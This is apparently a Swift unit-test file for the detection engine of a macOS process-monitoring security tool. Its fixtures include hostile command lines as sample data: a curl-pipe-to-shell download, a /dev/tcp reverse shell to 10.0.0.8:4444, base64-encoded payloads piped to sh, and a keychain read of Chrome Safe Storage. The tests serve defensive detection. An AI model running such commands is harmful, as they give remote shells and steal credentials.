import XCTest
@testable import GhostProcessSniperCore

final class SentinelEngineTests: XCTestCase {
    private let now = Date(timeIntervalSince1970: 1_900_000_000)

    private func process(_ pid: Int32, _ name: String, _ path: String, command: String? = nil, parent: Int32 = 1) -> ProcessMetrics {
        ProcessMetrics(identity: ProcessIdentity(pid: pid, startTimeSeconds: 100, startTimeMicroseconds: UInt64(pid)),
                       parentPID: parent, userID: 501, ownerName: "me", name: name, executablePath: path,
                       commandLine: command ?? path, residentMemoryBytes: 10_000_000, physicalFootprintBytes: 10_000_000,
                       virtualMemoryBytes: 20_000_000, cpuPercent: 0, totalProcessorSeconds: 1, threadCount: 1,
                       isSystemProcess: SentinelCatalog.isSystemLocation(path), sampledAt: now)
    }

    private var baseline: [ProcessMetrics] {
        [
            process(300, "Google Chrome", "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"),
            process(301, "Finder", "/System/Library/CoreServices/Finder.app/Contents/MacOS/Finder"),
        ]
    }

    func testBaselineIsNotAFloodOfLaunches() async {
        let engine = SentinelEngine(live: .rulesOnly)
        let report = await engine.ingest(processes: baseline, uiVisible: true, now: now)
        XCTAssertTrue(report.launches.isEmpty)
        XCTAssertTrue(report.findings.isEmpty)
    }

    func testNewAttackChainBecomesAFindingAndAFeedEntry() async {
        let engine = SentinelEngine(live: .rulesOnly)
        _ = await engine.ingest(processes: baseline, uiVisible: true, now: now)
        let attack = process(400, "zsh", "/bin/zsh", command: "zsh -c curl -s http://1.2.3.4/a | sh", parent: 300)
        let report = await engine.ingest(processes: baseline + [attack], uiVisible: true, now: now.addingTimeInterval(1))

        XCTAssertEqual(report.findings.first?.severity, .dangerous)
        XCTAssertEqual(report.findings.first?.lineageText, "Google Chrome › zsh")
        XCTAssertEqual(report.launches.first?.name, "zsh")
        XCTAssertEqual(report.launchesLastMinute, 1)
        XCTAssertEqual(report.activeFindingCount, 1)
    }

    func testFindingOutlivesItsProcessThenExpires() async {
        let engine = SentinelEngine(live: .rulesOnly)
        _ = await engine.ingest(processes: baseline, uiVisible: true, now: now)
        let attack = process(401, "bash", "/bin/bash", command: "bash -i >& /dev/tcp/10.0.0.8/4444 0>&1", parent: 300)
        _ = await engine.ingest(processes: baseline + [attack], uiVisible: true, now: now.addingTimeInterval(1))

        let gone = await engine.ingest(processes: baseline, uiVisible: true, now: now.addingTimeInterval(2))
        XCTAssertEqual(gone.findings.first?.isRunning, false, "an exited attack stays visible as history")
        XCTAssertNil(gone.highestSeverity, "only running findings set the live level")

        let later = await engine.ingest(processes: baseline, uiVisible: true, now: now.addingTimeInterval(SentinelEngine.findingRetention + 5))
        XCTAssertTrue(later.findings.isEmpty)
    }

    func testDismissHidesAFindingForAsLongAsItLasts() async {
        let engine = SentinelEngine(live: .rulesOnly)
        _ = await engine.ingest(processes: baseline, uiVisible: true, now: now)
        let tunnel = process(402, "ngrok", "/opt/homebrew/bin/ngrok", command: "ngrok http 3000")
        let report = await engine.ingest(processes: baseline + [tunnel], uiVisible: true, now: now.addingTimeInterval(1))
        let finding = try? XCTUnwrap(report.findings.first)
        XCTAssertEqual(finding?.severity, .notable)

        await engine.dismiss(findingID: finding?.id ?? "")
        let dismissed = await engine.currentReport
        XCTAssertTrue(dismissed.findings.isEmpty)
        XCTAssertEqual(dismissed.dismissedCount, 1)

        _ = await engine.ingest(processes: baseline, uiVisible: true, now: now.addingTimeInterval(2))
        let expired = await engine.ingest(processes: baseline, uiVisible: true,
                                          now: now.addingTimeInterval(SentinelEngine.findingRetention + 5))
        XCTAssertEqual(expired.dismissedCount, 0, "the dismissal went with its finding")
    }

    func testLateArgumentsAreJudgedAgain() async {
        let engine = SentinelEngine(live: .rulesOnly)
        _ = await engine.ingest(processes: baseline, uiVisible: true, now: now)
        let bare = process(404, "sh", "/bin/sh", command: "/bin/sh")
        _ = await engine.ingest(processes: baseline + [bare], uiVisible: true, now: now.addingTimeInterval(1))
        let full = process(404, "sh", "/bin/sh", command: "/bin/sh -c echo aGk= | base64 -d | sh")
        let report = await engine.ingest(processes: baseline + [full], uiVisible: true, now: now.addingTimeInterval(2))
        XCTAssertTrue(report.findings.contains { $0.signals.contains { $0.kind == .encodedPayload } })
    }

    /// The chain is captured at first sight because a parent that exits takes that evidence with it; judging
    /// the process again once its arguments arrive must not throw the chain away.
    func testALateJudgementKeepsTheChainCapturedAtFirstSight() async throws {
        let engine = SentinelEngine(live: .rulesOnly)
        _ = await engine.ingest(processes: baseline, uiVisible: true, now: now)
        let wrapper = process(410, "zsh", "/bin/zsh", command: "zsh -c nohup x &", parent: 300)
        let payload = process(411, "bash", "/bin/bash", command: "bash", parent: 410)
        let first = await engine.ingest(processes: baseline + [wrapper, payload], uiVisible: true, now: now.addingTimeInterval(1))
        let seen = try XCTUnwrap(first.findings.first { $0.identity.pid == 411 })
        XCTAssertEqual(seen.lineageText, "Google Chrome › zsh › bash")

        // The wrapper exits, launchd adopts the payload, and its full arguments arrive.
        let orphan = process(411, "bash", "/bin/bash", command: "bash -c echo aGk= | base64 -d | bash", parent: 1)
        let later = await engine.ingest(processes: baseline + [orphan], uiVisible: true, now: now.addingTimeInterval(2))
        let finding = try XCTUnwrap(later.findings.first { $0.identity.pid == 411 })
        XCTAssertEqual(finding.lineageText, "Google Chrome › zsh › bash", "the launcher is still who started it")
        XCTAssertTrue(finding.signals.contains { $0.kind == .appSpawnedShell })
        XCTAssertEqual(finding.severity, .dangerous, "an app-launched shell that carries a payload")
        XCTAssertTrue(finding.headline.hasPrefix("Google Chrome started"), finding.headline)
    }

    /// A parent that is still there is read again: its own arguments may have arrived since.
    func testALaterJudgementStillReadsAParentThatIsAlive() async throws {
        let engine = SentinelEngine(live: .rulesOnly)
        _ = await engine.ingest(processes: baseline, uiVisible: true, now: now)
        let wrapper = process(410, "zsh", "/bin/zsh", command: "zsh", parent: 300)
        let child = process(411, "bash", "/bin/bash", command: "bash", parent: 410)
        let first = await engine.ingest(processes: baseline + [wrapper, child], uiVisible: true, now: now.addingTimeInterval(1))
        XCTAssertEqual(first.findings.first { $0.identity.pid == 411 }?.severity, .suspicious)

        // The wrapper's arguments arrive and name it a browser extension's native-messaging host.
        let named = process(410, "zsh", "/bin/zsh", command: "zsh /Users/me/host.sh chrome-extension://abc/", parent: 300)
        let longer = process(411, "bash", "/bin/bash", command: "bash -c whoami", parent: 410)
        let report = await engine.ingest(processes: baseline + [named, longer], uiVisible: true, now: now.addingTimeInterval(2))
        let finding = try XCTUnwrap(report.findings.first { $0.identity.pid == 411 })
        XCTAssertEqual(finding.lineageText, "Google Chrome › zsh › bash")
        XCTAssertEqual(finding.severity, .notable, "the parent's new arguments are read, not the ones captured at first sight")
    }

    func testAppHelpersStayOutOfTheFeed() async {
        let engine = SentinelEngine(live: .rulesOnly)
        _ = await engine.ingest(processes: baseline, uiVisible: true, now: now)
        let helper = process(405, "Google Chrome Helper",
            "/Applications/Google Chrome.app/Contents/Frameworks/Google Chrome Framework.framework/Helpers/Google Chrome Helper.app/Contents/MacOS/Google Chrome Helper",
            command: "--type=gpu-process", parent: 300)
        let tool = process(406, "rg", "/opt/homebrew/bin/rg", command: "rg TODO")
        let report = await engine.ingest(processes: baseline + [helper, tool], uiVisible: true, now: now.addingTimeInterval(1))
        XCTAssertEqual(report.launches.map(\.name), ["rg"])
    }

    func testUnchangedTicksKeepTheSameRevision() async {
        let engine = SentinelEngine(live: .rulesOnly)
        let first = await engine.ingest(processes: baseline, uiVisible: true, now: now)
        let second = await engine.ingest(processes: baseline, uiVisible: true, now: now.addingTimeInterval(1))
        XCTAssertEqual(first.revision, second.revision, "a quiet tick must not republish the Security page")
    }
}

extension SentinelEngineTests {
    private func listener(_ pid: Int32, path: String, port: Int) -> ProcessMetrics {
        let forensics = ProcessForensics(currentDirectory: nil, rootDirectory: nil, openFileCount: nil, socketCount: 1,
                                         listeningPorts: [port], isPartial: false, notes: [])
        return ProcessMetrics(identity: ProcessIdentity(pid: pid, startTimeSeconds: 100, startTimeMicroseconds: UInt64(pid)),
                              parentPID: 1, userID: 501, ownerName: "me", name: "server", executablePath: path,
                              commandLine: path, residentMemoryBytes: 10_000_000, physicalFootprintBytes: 10_000_000,
                              virtualMemoryBytes: 20_000_000, cpuPercent: 0, totalProcessorSeconds: 1, threadCount: 1,
                              isSystemProcess: false, sampledAt: now, forensics: forensics)
    }

    /// Rules that weigh the signer run again once it is read: an
    /// Apple-signed program listening from /tmp loses the listener alarm it
    /// carried while its signature was unknown.
    func testSignatureArrivingLaterRevisitsTheVerdict() async throws {
        let folder = URL(fileURLWithPath: "/private/tmp/sentinel-\(UUID().uuidString.prefix(8))")
        try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: folder) }
        let copy = folder.appendingPathComponent("server").path
        try FileManager.default.copyItem(atPath: "/usr/bin/true", toPath: copy)
        let server = listener(99_901, path: copy, port: 8080)

        let unknown = SentinelEngine(live: .rulesOnly)
        _ = await unknown.ingest(processes: baseline, uiVisible: true, now: now)
        let before = await unknown.ingest(processes: baseline + [server], uiVisible: true, now: now.addingTimeInterval(1))
        XCTAssertTrue(before.findings.first?.signals.contains { $0.kind == .tunnel } ?? false, "unknown signer: a look, not an alarm")
        XCTAssertEqual(before.findings.first?.severity, .suspicious)

        let engine = SentinelEngine(live: SentinelEngine.Live(watchesSpawns: false, readsSensors: false, inspectsSignatures: true,
                                                             watchesStartupItems: false))
        _ = await engine.ingest(processes: baseline, uiVisible: true, now: now)
        var report = await engine.ingest(processes: baseline + [server], uiVisible: true, now: now.addingTimeInterval(1))
        for tick in 2..<60 where report.findings.first?.signing == nil {
            try await Task.sleep(for: .milliseconds(50))
            report = await engine.ingest(processes: baseline + [server], uiVisible: true, now: now.addingTimeInterval(Double(tick)))
        }
        let finding = try XCTUnwrap(report.findings.first)
        XCTAssertEqual(finding.signing?.authority, .apple)
        XCTAssertFalse(finding.signals.contains { $0.kind == .tunnel }, "\(finding.signals)")
        XCTAssertEqual(finding.severity, .suspicious, "still a program running from /tmp")
    }
}

extension SentinelEngineTests {
    /// Ghost run from its mounted disk image, and a shell it started, are
    /// never judged; the same processes belonging to anyone else are.
    func testGhostNeverJudgesItselfOrWhatItStarts() async {
        let ghost = process(700, "Ghost Process Sniper",
                            "/Volumes/Ghost Process Sniper/Ghost Process Sniper.app/Contents/MacOS/Ghost Process Sniper")
        let child = process(701, "sh", "/bin/sh", command: "/bin/sh -c curl -s http://1.2.3.4/a | sh", parent: 700)
        let grandchild = process(702, "security", "/usr/bin/security",
                                 command: "security find-generic-password -wa 'Chrome Safe Storage'", parent: 701)

        let other = SentinelEngine(live: .rulesOnly, ownPID: 1_234)
        _ = await other.ingest(processes: baseline, uiVisible: true, now: now)
        let flagged = await other.ingest(processes: baseline + [ghost, child, grandchild], uiVisible: true, now: now.addingTimeInterval(1))
        XCTAssertEqual(Set(flagged.findings.map(\.identity.pid)), [700, 701, 702], "the fixtures are findings for anyone else")

        let engine = SentinelEngine(live: .rulesOnly, ownPID: 700)
        _ = await engine.ingest(processes: baseline, uiVisible: true, now: now)
        let report = await engine.ingest(processes: baseline + [ghost, child, grandchild], uiVisible: true, now: now.addingTimeInterval(1))
        XCTAssertTrue(report.findings.isEmpty, "\(report.findings.map(\.headline))")
        XCTAssertTrue(report.launches.isEmpty)
    }
}
